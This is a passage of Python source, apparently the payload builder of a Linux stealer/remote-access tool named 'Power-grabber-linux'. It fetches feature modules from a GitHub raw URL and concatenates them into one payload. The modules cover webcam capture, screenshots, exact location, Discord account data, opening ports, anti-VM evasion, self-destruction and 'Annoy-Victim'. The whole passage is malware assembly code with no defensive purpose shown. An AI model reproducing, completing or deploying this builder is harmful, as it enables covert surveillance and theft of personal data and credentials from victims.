...
if 'Annoy-Victim' in features:
    annoy_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Annoy.py').text.strip()
    combined_code += annoy_code + "\n" if annoy_code else ""
if 'Self-destruction' in features:
    destruct_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Self-destruct.py').text.strip()
    combined_code += destruct_code + "\n" if destruct_code else ""
if 'Webcam' in features:
    webcam_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Webcam.py').text.strip()
    combined_code += webcam_code + "\n" if webcam_code else ""
if 'Screenshot' in features:
    screenshot_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Screenshot.py').text.strip()
    combined_code += screenshot_code + "\n" if screenshot_code else ""
if 'Port-Creation' in features:
    port_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Port.py').text.strip()
    combined_code += port_code + "\n" if port_code else ""
if 'Anti-VM' in features:
    vm_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/vm-check.py').text.strip()
    combined_code += vm_code + "\n" if vm_code else ""
if 'Exact-location' in features:
    location_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Location.py').text.strip()
...
if 'Discord-Info' in features:
    discord_code = requests.get('https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Discord-Info.py').text.strip()
